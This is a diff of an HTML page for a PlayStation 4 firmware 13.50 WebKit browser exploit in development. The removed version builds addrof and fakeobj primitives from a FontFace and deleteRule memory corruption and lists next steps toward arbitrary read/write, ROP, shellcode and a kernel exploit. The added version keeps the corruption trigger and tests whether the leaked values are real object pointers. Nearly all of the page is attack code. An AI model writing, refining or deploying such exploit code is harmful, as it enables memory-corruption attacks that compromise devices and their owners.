@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 13.50 WebKit Exploit</title>
+<title>PS4 13.50 - Address Variation Test</title>
 <style>
     * {
         margin: 0;
@@ -16,7 +16,6 @@
         color: #00ff41;
         min-height: 100vh;
         padding: 20px;
-        overflow-x: hidden;
     }
     
     .container {
@@ -32,38 +31,26 @@
         border-radius: 15px;
         margin-bottom: 30px;
         box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
-        animation: glow 2s ease-in-out infinite alternate;
-    }
-    
-    @keyframes glow {
-        from { box-shadow: 0 0 20px rgba(0, 255, 65, 0.3); }
-        to { box-shadow: 0 0 40px rgba(0, 255, 65, 0.6); }
     }
     
     .header h1 {
-        font-size: 2.5em;
+        font-size: 2.2em;
         text-shadow: 0 0 20px rgba(0, 255, 65, 0.8);
         margin-bottom: 10px;
         letter-spacing: 3px;
     }
     
     .header .subtitle {
-        font-size: 1.2em;
+        font-size: 1.1em;
         color: #00cc33;
         letter-spacing: 2px;
     }
     
-    .controls {
-        display: flex;
-        justify-content: center;
-        gap: 20px;
-        margin-bottom: 30px;
-        flex-wrap: wrap;
-    }
-    
     .btn {
-        padding: 20px 40px;
-        font-size: 1.3em;
+        display: block;
+        margin: 0 auto 30px;
+        padding: 20px 50px;
+        font-size: 1.4em;
         font-weight: bold;
         border: 3px solid #00ff41;
         background: linear-gradient(135deg, rgba(0, 255, 65, 0.1) 0%, rgba(0, 255, 65, 0.2) 100%);
@@ -75,26 +62,6 @@
         text-transform: uppercase;
         letter-spacing: 2px;
         box-shadow: 0 5px 15px rgba(0, 255, 65, 0.3);
-        position: relative;
-        overflow: hidden;
-    }
-    
-    .btn:before {
-        content: '';
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        width: 0;
-        height: 0;
-        border-radius: 50%;
-        background: rgba(0, 255, 65, 0.3);
-        transform: translate(-50%, -50%);
-        transition: width 0.6s, height 0.6s;
-    }
-    
-    .btn:hover:before {
-        width: 300px;
-        height: 300px;
     }
     
     .btn:hover {
@@ -103,73 +70,12 @@
         transform: translateY(-3px);
     }
     
-    .btn:active {
-        transform: translateY(0);
-    }
-    
-    .btn span {
-        position: relative;
-        z-index: 1;
-    }
-    
-    .status-bar {
-        display: flex;
-        justify-content: space-around;
-        margin-bottom: 30px;
-        gap: 20px;
-        flex-wrap: wrap;
-    }
-    
-    .status-item {
-        flex: 1;
-        min-width: 200px;
-        padding: 20px;
-        background: rgba(0, 255, 65, 0.05);
-        border: 2px solid #00ff41;
-        border-radius: 10px;
-        text-align: center;
-    }
-    
-    .status-item .label {
-        font-size: 0.9em;
-        color: #00cc33;
-        margin-bottom: 10px;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-    }
-    
-    .status-item .value {
-        font-size: 1.5em;
-        font-weight: bold;
-        color: #00ff41;
-        text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
-    }
-    
-    .status-item.success .value {
-        color: #00ff41;
-        animation: pulse 1s ease-in-out infinite;
-    }
-    
-    .status-item.pending .value {
-        color: #ffaa00;
-    }
-    
-    .status-item.error .value {
-        color: #ff0000;
-    }
-    
-    @keyframes pulse {
-        0%, 100% { opacity: 1; }
-        50% { opacity: 0.6; }
-    }
-    
     .log-container {
         background: rgba(0, 0, 0, 0.8);
         border: 2px solid #00ff41;
         border-radius: 10px;
         padding: 20px;
         box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
-        position: relative;
     }
     
     .log-header {
@@ -177,35 +83,14 @@
         margin-bottom: 15px;
         padding-bottom: 10px;
         border-bottom: 2px solid #00ff41;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-    }
-    
-    .log-header .title {
         text-transform: uppercase;
         letter-spacing: 2px;
     }
     
-    .log-header .clear-btn {
-        padding: 5px 15px;
-        font-size: 0.8em;
-        border: 1px solid #00ff41;
-        background: rgba(0, 255, 65, 0.1);
-        color: #00ff41;
-        cursor: pointer;
-        border-radius: 5px;
-        transition: all 0.3s;
-    }
-    
-    .log-header .clear-btn:hover {
-        background: rgba(0, 255, 65, 0.3);
-    }
-    
     #log {
-        font-size: 0.95em;
+        font-size: 0.9em;
         line-height: 1.6;
-        max-height: 500px;
+        max-height: 600px;
         overflow-y: auto;
         white-space: pre-wrap;
         word-wrap: break-word;
@@ -228,89 +113,26 @@
         border-radius: 5px;
     }
     
-    .log-line-success {
-        color: #00ff41;
-        font-weight: bold;
-    }
-    
-    .log-line-error {
-        color: #ff3366;
-        font-weight: bold;
-    }
-    
-    .log-line-warning {
-        color: #ffaa00;
-    }
-    
-    .log-line-info {
-        color: #00ccff;
-    }
-    
-    .footer {
-        text-align: center;
-        margin-top: 30px;
-        padding: 20px;
-        color: #00cc33;
-        font-size: 0.9em;
-    }
-    
-    .exploit-phase {
-        margin: 20px 0;
-        padding: 15px;
-        background: rgba(0, 255, 65, 0.03);
-        border-left: 4px solid #00ff41;
-        border-radius: 5px;
-    }
-    
-    .exploit-phase.active {
-        background: rgba(0, 255, 65, 0.1);
-        box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
-    }
+    .success { color: #00ff41; font-weight: bold; }
+    .error { color: #ff3366; font-weight: bold; }
+    .warning { color: #ffaa00; }
+    .info { color: #00ccff; }
+    .highlight { color: #ff00ff; font-weight: bold; }
 </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <h1>◈ PS4 WEBKIT EXPLOIT ◈</h1>
-        <div class="subtitle">FIRMWARE 13.50 | addrof + fakeobj</div>
+        <h1>◈ ADDRESS VARIATION TEST ◈</h1>
+        <div class="subtitle">Testing if different objects leak different addresses</div>
     </div>
     
-    <div class="controls">
-        <button class="btn" onclick="runExploit()">
-            <span>► RUN EXPLOIT</span>
-        </button>
-    </div>
-    
-    <div class="status-bar">
-        <div class="status-item" id="status-corruption">
-            <div class="label">Corruption</div>
-            <div class="value">READY</div>
-        </div>
-        <div class="status-item" id="status-addrof">
-            <div class="label">addrof</div>
-            <div class="value">PENDING</div>
-        </div>
-        <div class="status-item" id="status-fakeobj">
-            <div class="label">fakeobj</div>
-            <div class="value">PENDING</div>
-        </div>
-        <div class="status-item" id="status-exploit">
-            <div class="label">Status</div>
-            <div class="value">IDLE</div>
-        </div>
-    </div>
+    <button class="btn" onclick="runTest()">► RUN TEST</button>
     
     <div class="log-container">
-        <div class="log-header">
-            <div class="title">◈ EXPLOIT LOG ◈</div>
-            <button class="clear-btn" onclick="clearLog()">CLEAR</button>
-        </div>
+        <div class="log-header">◈ TEST RESULTS ◈</div>
         <div id="log"></div>
-    </div>
-    
-    <div class="footer">
-        WebKit Type Confusion Exploit | addrof/fakeobj Primitives | PS4 13.50
     </div>
 </div>
 
@@ -319,37 +141,21 @@
 
 let logBuf = [];
 
-function log(msg, type = 'normal') {
-    logBuf.push({ msg, type });
-    updateLog();
-}
-
-function updateLog() {
+function log(msg) {
+    logBuf.push(msg);
     let d = document.getElementById('log');
     if (d) {
-        d.innerHTML = logBuf.map(item => {
+        d.innerHTML = logBuf.map(line => {
             let className = '';
-            if (item.msg.includes('[+++]') || item.msg.includes('SUCCESS')) className = 'log-line-success';
-            else if (item.msg.includes('[ERROR]') || item.msg.includes('FAILED')) className = 'log-line-error';
-            else if (item.msg.includes('[+]') || item.msg.includes('WORKING')) className = 'log-line-info';
-            else if (item.msg.includes('[!]') || item.msg.includes('WARNING')) className = 'log-line-warning';
+            if (line.includes('[+++]')) className = 'success';
+            else if (line.includes('[ERROR]')) className = 'error';
+            else if (line.includes('[!]')) className = 'warning';
+            else if (line.includes('[UNIQUE]')) className = 'highlight';
+            else if (line.includes('[+]')) className = 'info';
             
-            return `<span class="${className}">${item.msg}</span>`;
+            return `<span class="${className}">${line}</span>`;
         }).join('\n');
         d.scrollTop = d.scrollHeight;
-    }
-}
-
-function clearLog() {
-    logBuf = [];
-    updateLog();
-}
-
-function setStatus(id, value, state = 'pending') {
-    let el = document.getElementById('status-' + id);
-    if (el) {
-        el.className = 'status-item ' + state;
-        el.querySelector('.value').textContent = value;
     }
 }
 
@@ -371,34 +177,24 @@ class Int64 {
         return new Int64(parts[0], parts[1]);
     }
     
-    asDouble() {
-        let buf = new ArrayBuffer(8);
-        let u32 = new Uint32Array(buf);
-        u32[0] = this.low;
-        u32[1] = this.high;
-        return new Float64Array(buf)[0];
-    }
-    
     toString() {
         return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
     }
+    
+    equals(other) {
+        return this.low === other.low && this.high === other.high;
+    }
 }
 
-let exploitResults = {
-    leaked: [],
-    addrof: null,
-    fakeobj: null
-};
-
-function runExploit() {
-    clearLog();
+function runTest() {
+    logBuf = [];
     
     log('═══════════════════════════════════════════════════════');
-    log('         PS4 13.50 WEBKIT EXPLOIT - FULL CHAIN          ');
+    log('       ADDRESS VARIATION TEST - PS4 13.50               ');
     log('═══════════════════════════════════════════════════════\n');
     
-    setStatus('corruption', 'RUNNING...', 'pending');
-    setStatus('exploit', 'ACTIVE', 'pending');
+    log('[GOAL] Determine if different objects produce different addresses');
+    log('[METHOD] Test multiple objects at multiple indices\n');
     
     // Setup
     let style = document.createElement('style');
@@ -406,7 +202,7 @@ function runExploit() {
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
-    // Create arrays BEFORE corruption
+    // Arrays
     let floatArray = new Float64Array(100);
     let objectArray = new Array(100);
     
@@ -415,10 +211,7 @@ function runExploit() {
         objectArray[i] = { id: i };
     }
     
-    log('[SETUP] Arrays created and pre-filled');
-    log('  Float64Array[100] | Array[100]');
-    log('  Pattern: floatArray[i] = 1.1 * (i+1)');
-    log('  Pattern: objectArray[i] = {id: i}\n');
+    log('[SETUP] Arrays created and pre-filled\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -432,7 +225,7 @@ function runExploit() {
             if (!fired && this === A) {
                 fired = true;
                 
-                log('[PHASE 1] ▼▼▼ INSIDE GETTER ▼▼▼\n');
+                log('[*] Inside getter - triggering corruption\n');
                 
                 // Create corrupted fonts
                 let corrupted = [];
@@ -442,267 +235,196 @@ function runExploit() {
                     }));
                 }
                 
-                log('[CORRUPTION] Creating corrupted fonts...');
-                log('  Created: ' + corrupted.length + ' fonts');
-                
-                // Trigger corruption
+                // Trigger
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
                 
-                log('[CORRUPTION] Triggered via deleteRule()');
-                log('[CORRUPTION] ✓ Memory corruption active!\n');
+                log('[CORRUPTION] Active\n');
                 
-                setStatus('corruption', 'ACTIVE', 'success');
-                
-                // ═══════════════════════════════════════════
-                // TESTS 1-3: REQUIRED SETUP
-                // ═══════════════════════════════════════════
-                
-                log('[PHASE 2] ▼▼▼ SETUP SEQUENCE ▼▼▼\n');
-                
-                // Test 1
-                log('[TEST 1] Accessing corrupted font properties...');
-                try {
-                    let victim = corrupted[0];
-                    log('  status: ' + victim.status);
-                    log('  family: ' + victim.family);
-                    log('  [+] Properties accessible\n');
-                } catch(e) {
-                    log('  [!] ERROR: ' + e.message + '\n');
-                }
-                
-                // Test 2
-                log('[TEST 2] Storing object in corrupted font...');
-                try {
-                    let victim = corrupted[1];
-                    victim.customProp = { marker: 0xBEEF };
-                    log('  [+] Object stored in font.customProp\n');
-                } catch(e) {
-                    log('  [!] ERROR: ' + e.message + '\n');
-                }
-                
-                // Test 3 - CRITICAL
-                log('[TEST 3] Mixing corrupted font with arrays...');
-                try {
-                    let victim = corrupted[2];
-                    floatArray[50] = victim;
-                    log('  [+] Stored corrupted font in floatArray[50]');
-                    log('  [+] Type confusion primed!\n');
-                } catch(e) {
-                    log('  [!] ERROR: ' + e.message + '\n');
-                }
-                
-                // ═══════════════════════════════════════════
-                // TEST 4: ADDROF PRIMITIVE
-                // ═══════════════════════════════════════════
-                
-                log('[PHASE 3] ▼▼▼ addrof PRIMITIVE ▼▼▼\n');
-                
-                setStatus('addrof', 'TESTING...', 'pending');
+                // Required setup (Tests 1-3)
+                log('[SETUP] Running required Tests 1-3...\n');
                 
                 try {
-                    let targetObject = { 
-                        marker: 0xDEADBEEF, 
-                        test: "LEAK_ME",
-                        value: 31337 
-                    };
+                    let v1 = corrupted[0];
+                    let _ = v1.status;
                     
-                    log('[addrof] Target: ' + JSON.stringify(targetObject));
-                    log('[addrof] Storing in objectArray[50]...');
+                    let v2 = corrupted[1];
+                    v2.prop = { x: 1 };
                     
-                    objectArray[50] = targetObject;
+                    let v3 = corrupted[2];
+                    floatArray[50] = v3;
                     
-                    log('[addrof] Reading floatArray[50]...');
-                    let leaked = floatArray[50];
-                    
-                    log('[addrof] Raw value: ' + leaked);
-                    
-                    if (typeof leaked === 'number') {
-                        let addr = Int64.fromDouble(leaked);
-                        log('[addrof] As Int64: ' + addr.toString());
-                        
-                        if ((addr.high & 0xfff80000) === 0x7ff80000) {
-                            log('[+++] addrof SUCCESS! NaN-boxed pointer leaked!');
-                            log('[+++] Address: ' + addr.toString());
-                            
-                            exploitResults.leaked.push(addr);
-                            exploitResults.addrof = addr;
-                            
-                            setStatus('addrof', 'SUCCESS', 'success');
-                        } else {
-                            log('[-] Not NaN-boxed format');
-                            setStatus('addrof', 'FAILED', 'error');
-                        }
-                    }
-                    
+                    log('[SETUP] ✓ Tests 1-3 complete\n');
                 } catch(e) {
-                    log('[ERROR] addrof failed: ' + e.message);
-                    setStatus('addrof', 'ERROR', 'error');
+                    log('[SETUP] ! Error: ' + e.message + '\n');
                 }
                 
-                log('');
-                
                 // ═══════════════════════════════════════════
-                // TEST 5: FAKEOBJ PRIMITIVE
+                // MAIN TEST: Multiple Objects & Indices
                 // ═══════════════════════════════════════════
                 
-                log('[PHASE 4] ▼▼▼ fakeobj PRIMITIVE ▼▼▼\n');
+                log('╔════════════════════════════════════════════════╗');
+                log('║      TESTING DIFFERENT OBJECTS                 ║');
+                log('╚════════════════════════════════════════════════╝\n');
                 
-                setStatus('fakeobj', 'TESTING...', 'pending');
-                
-                if (exploitResults.addrof) {
-                    try {
-                        log('[fakeobj] Using leaked address: ' + exploitResults.addrof.toString());
-                        log('[fakeobj] Storing as float in floatArray[60]...');
-                        
-                        floatArray[60] = exploitResults.addrof.asDouble();
-                        
-                        log('[fakeobj] Reading objectArray[60]...');
-                        let faked = objectArray[60];
-                        
-                        log('[fakeobj] Result type: ' + typeof faked);
-                        
-                        if (typeof faked === 'object' && faked !== null) {
-                            log('[fakeobj] Got object back!');
-                            
-                            try {
-                                log('[fakeobj] Checking properties...');
-                                log('[fakeobj]   faked.marker = ' + hex(faked.marker));
-                                log('[fakeobj]   faked.test = "' + faked.test + '"');
-                                log('[fakeobj]   faked.value = ' + faked.value);
-                                
-                                if (faked.marker === 0xDEADBEEF) {
-                                    log('[+++] fakeobj SUCCESS! Got original object back!');
-                                    log('[+++] Round-trip: object → address → object ✓');
-                                    
-                                    exploitResults.fakeobj = true;
-                                    setStatus('fakeobj', 'SUCCESS', 'success');
-                                } else {
-                                    log('[+] Got different object (might be offset)');
-                                    setStatus('fakeobj', 'PARTIAL', 'success');
-                                }
-                                
-                            } catch(e) {
-                                log('[+] Error accessing properties: ' + e.message);
-                                log('[+] Created invalid object - fakeobj working!');
-                                exploitResults.fakeobj = true;
-                                setStatus('fakeobj', 'SUCCESS', 'success');
-                            }
-                        } else {
-                            log('[-] Did not get object');
-                            setStatus('fakeobj', 'FAILED', 'error');
-                        }
-                        
-                    } catch(e) {
-                        log('[ERROR] fakeobj failed: ' + e.message);
-                        setStatus('fakeobj', 'ERROR', 'error');
-                    }
-                } else {
-                    log('[!] Skipping fakeobj - no address leaked');
-                    setStatus('fakeobj', 'SKIPPED', 'error');
-                }
-                
-                log('');
-                
-                // ═══════════════════════════════════════════
-                // TEST 6: MULTIPLE OBJECTS
-                // ═══════════════════════════════════════════
-                
-                log('[PHASE 5] ▼▼▼ TESTING MULTIPLE OBJECTS ▼▼▼\n');
-                
-                let testObjs = [
-                    { test: 1, val: 0x1111 },
-                    { test: 2, val: 0x2222 },
-                    new ArrayBuffer(256)
+                let testObjects = [
+                    { name: "obj1", marker: 0x11111111 },
+                    { name: "obj2", marker: 0x22222222 },
+                    { name: "obj3", marker: 0x33333333 },
+                    { name: "obj4", marker: 0x44444444 },
+                    { name: "obj5", marker: 0x55555555 },
+                    new ArrayBuffer(0x100),
+                    new Uint32Array(16),
+                    new Float64Array(16),
+                    [1, 2, 3, 4, 5],
+                    "string_object"
                 ];
                 
-                for (let i = 0; i < testObjs.length; i++) {
+                let leakedAddresses = [];
+                
+                log('[TEST] Leaking ' + testObjects.length + ' different objects:\n');
+                
+                for (let i = 0; i < testObjects.length; i++) {
                     try {
-                        let idx = 70 + i * 3;
-                        objectArray[idx] = testObjs[i];
+                        let obj = testObjects[i];
+                        let idx = 50; // Use same index to isolate object variation
+                        
+                        // Store object
+                        objectArray[idx] = obj;
+                        
+                        // Read as float
                         let leaked = floatArray[idx];
                         
                         if (typeof leaked === 'number') {
                             let addr = Int64.fromDouble(leaked);
-                            if ((addr.high & 0xfff80000) === 0x7ff80000) {
-                                log('[' + i + '] ' + addr.toString() + ' [+++] LEAKED');
-                                exploitResults.leaked.push(addr);
-                            } else {
-                                log('[' + i + '] ' + addr.toString() + ' [-] Not NaN-boxed');
-                            }
+                            
+                            let objStr = (typeof obj === 'object' && obj !== null && obj.name) 
+                                ? obj.name 
+                                : typeof obj;
+                            
+                            log('[' + String(i).padStart(2, '0') + '] ' + objStr.padEnd(15, ' ') + ' → ' + addr.toString());
+                            
+                            leakedAddresses.push(addr);
                         }
+                        
                     } catch(e) {
-                        log('[' + i + '] ERROR: ' + e.message);
+                        log('[' + String(i).padStart(2, '0') + '] ERROR: ' + e.message);
                     }
                 }
                 
-                log('');
+                log('\n');
                 
                 // ═══════════════════════════════════════════
-                // FINAL SUMMARY
+                // SAME OBJECT, DIFFERENT INDICES
                 // ═══════════════════════════════════════════
                 
-                log('═══════════════════════════════════════════════════════');
-                log('                    EXPLOIT SUMMARY                     ');
-                log('═══════════════════════════════════════════════════════\n');
+                log('╔════════════════════════════════════════════════╗');
+                log('║      TESTING DIFFERENT INDICES                 ║');
+                log('╚════════════════════════════════════════════════╝\n');
                 
-                log('[PRIMITIVES]');
-                log('  addrof:  ' + (exploitResults.addrof ? '✓ WORKING' : '✗ FAILED'));
-                log('  fakeobj: ' + (exploitResults.fakeobj ? '✓ WORKING' : '✗ FAILED'));
-                log('');
+                let singleObj = { test: "same_object", marker: 0xABCDEF };
+                let indicesAddresses = [];
                 
-                log('[LEAKED ADDRESSES]');
-                log('  Total: ' + exploitResults.leaked.length);
-                for (let i = 0; i < Math.min(5, exploitResults.leaked.length); i++) {
-                    log('  [' + i + '] ' + exploitResults.leaked[i].toString());
+                let testIndices = [40, 45, 50, 55, 60, 65, 70];
+                
+                log('[TEST] Same object at ' + testIndices.length + ' different indices:\n');
+                
+                for (let i = 0; i < testIndices.length; i++) {
+                    try {
+                        let idx = testIndices[i];
+                        
+                        objectArray[idx] = singleObj;
+                        let leaked = floatArray[idx];
+                        
+                        if (typeof leaked === 'number') {
+                            let addr = Int64.fromDouble(leaked);
+                            log('[idx=' + idx + '] ' + addr.toString());
+                            indicesAddresses.push(addr);
+                        }
+                        
+                    } catch(e) {
+                        log('[idx=' + testIndices[i] + '] ERROR: ' + e.message);
+                    }
                 }
-                log('');
                 
-                if (exploitResults.addrof && exploitResults.fakeobj) {
-                    log('[+++] BOTH PRIMITIVES WORKING!');
-                    log('[+++] Ready for arbitrary R/W exploit chain!');
-                    log('');
-                    log('[NEXT STEPS]');
-                    log('  1. Create fake Float64Array structure');
-                    log('  2. Use fakeobj to get JS reference');
-                    log('  3. Modify backing store pointer → arbitrary R/W');
-                    log('  4. Locate JIT RWX pages');
-                    log('  5. Write ROP chain + shellcode');
-                    log('  6. Chain to kernel exploit (13.50 offsets ready)');
-                    
-                    setStatus('exploit', 'READY', 'success');
-                } else if (exploitResults.addrof) {
-                    log('[+] addrof working - refine fakeobj');
-                    setStatus('exploit', 'PARTIAL', 'pending');
+                log('\n');
+                
+                // ═══════════════════════════════════════════
+                // ANALYSIS
+                // ═══════════════════════════════════════════
+                
+                log('╔════════════════════════════════════════════════╗');
+                log('║               ANALYSIS                         ║');
+                log('╚════════════════════════════════════════════════╝\n');
+                
+                // Check for unique addresses
+                let uniqueAddrs = new Set();
+                leakedAddresses.forEach(addr => {
+                    uniqueAddrs.add(addr.toString());
+                });
+                
+                log('[DIFFERENT OBJECTS TEST]');
+                log('  Total leaked: ' + leakedAddresses.length);
+                log('  Unique addresses: ' + uniqueAddrs.size);
+                
+                if (uniqueAddrs.size === 1) {
+                    log('  [!] ALL SAME ADDRESS - likely tagged null/metadata');
+                    log('  [!] Not leaking real object pointers');
+                } else if (uniqueAddrs.size === leakedAddresses.length) {
+                    log('  [+++] ALL UNIQUE - real object addresses!');
                 } else {
-                    log('[-] Primitives not working - try again');
-                    setStatus('exploit', 'FAILED', 'error');
+                    log('  [+] SOME VARIATION - ' + uniqueAddrs.size + '/' + leakedAddresses.length + ' unique');
                 }
                 
-                log('');
-                log('[!] Returning from getter - OOM will occur');
+                log('\n[DIFFERENT INDICES TEST]');
+                log('  Total leaked: ' + indicesAddresses.length);
+                
+                let allSameIndex = indicesAddresses.length > 0 && 
+                    indicesAddresses.every(addr => addr.equals(indicesAddresses[0]));
+                
+                if (allSameIndex) {
+                    log('  [+++] ALL SAME - consistent address for same object!');
+                } else {
+                    log('  [!] DIFFERENT - index affects leaked value');
+                }
+                
+                log('\n[CONCLUSION]');
+                
+                if (uniqueAddrs.size > 1 && allSameIndex) {
+                    log('  [+++] SUCCESS! Leaking real object addresses!');
+                    log('  [+++] Different objects = different addresses');
+                    log('  [+++] Same object = same address (consistent)');
+                    log('  [+++] addrof primitive is FULLY WORKING!');
+                } else if (uniqueAddrs.size === 1) {
+                    log('  [!] PROBLEM: All addresses are ' + Array.from(uniqueAddrs)[0]);
+                    log('  [!] Likely leaking a constant/tag, not real addresses');
+                    log('  [!] Need to decode differently or find different leak');
+                } else {
+                    log('  [?] MIXED RESULTS - review addresses above');
+                    log('  [?] May need refinement');
+                }
+                
+                log('\n[!] Returning - OOM will occur');
                 log('═══════════════════════════════════════════════════════\n');
                 
-                window.exploitResults = exploitResults;
+                window.leakedAddresses = leakedAddresses;
+                window.indicesAddresses = indicesAddresses;
             }
             
             return undefined;
         }
     });
     
-    log('[*] Starting exploit chain...\n');
+    log('[*] Starting test...\n');
     document.fonts.load('1em x', 'AB');
 }
 
-// Initial log
 log('═══════════════════════════════════════════════════════');
-log('         PS4 13.50 WEBKIT EXPLOIT READY                ');
+log('        ADDRESS VARIATION TEST READY                   ');
 log('═══════════════════════════════════════════════════════\n');
-log('[INFO] Target: PlayStation 4 Firmware 13.50');
-log('[INFO] Method: FontFace corruption → type confusion');
-log('[INFO] Primitives: addrof + fakeobj');
-log('[INFO] Goal: Arbitrary R/W → kernel exploit\n');
-log('[READY] Click RUN EXPLOIT to begin\n');
+log('[INFO] This test will determine if we are leaking');
+log('[INFO] real object addresses or just metadata/tags\n');
+log('[READY] Click RUN TEST\n');
 
 </script>
 </body>
